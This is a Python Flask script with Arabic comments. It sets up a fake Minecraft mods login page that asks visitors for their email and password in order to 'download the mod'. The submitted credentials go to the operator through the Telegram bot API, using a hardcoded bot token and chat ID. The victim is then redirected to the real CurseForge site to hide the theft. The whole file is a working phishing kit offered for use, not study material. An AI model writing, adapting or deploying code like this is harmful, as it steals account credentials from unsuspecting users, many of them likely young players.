from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# ضع الـ Token والـ ID الخاص بك هنا
BOT_TOKEN = "8601623969:AAF-8K0fFqoUIexccDlzJvsrzI3G1ZvI-JE"
CHAT_ID = "8553981064"

# التصميم بمظهر موقع مودات ماين كرافت
html_page = """
<html dir="rtl">
    <body style="background-color: #1a1a1a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
        <div style="background-color: #2c2c2c; padding: 40px; border-radius: 10px; width: 350px; text-align: center; border: 1px solid #444;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Minecraft_logo.png" style="width: 150px; margin-bottom: 20px;">
            <h2 style="color: #00ff99;">تسجيل الدخول للمودات</h2>
            <form method="POST" action="/login">
                <input type="email" name="user" placeholder="البريد الإلكتروني" style="width: 100%; padding: 10px; margin-bottom: 10px; background: #333; border: none; color: white;" required><br>
                <input type="password" name="pw" placeholder="كلمة السر" style="width: 100%; padding: 10px; margin-bottom: 20px; background: #333; border: none; color: white;" required><br>
                <button type="submit" style="width: 100%; padding: 10px; background-color: #0080ff; color: white; border: none; cursor: pointer; font-weight: bold;">تحميل المود</button>
            </form>
        </div>
    </body>
</html>
"""

@app.route('/')
def home():
    return html_page

@app.route('/login', methods=['POST'])
def login():
    user = request.form['user']
    pw = request.form['pw']
    
    # إرسال البيانات إليك
    msg = f"🎮 بيانات دخول ماين كرافت:\n📧 الإيميل: {user}\n🔑 الباسورد: {pw}"
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg})
    
    # تحويل المستخدم لموقع المودات الحقيقي بعد الضغط
    return redirect("https://www.curseforge.com/minecraft/mc-mods")

if __name__ == '__main__':
    app.run(port=5000)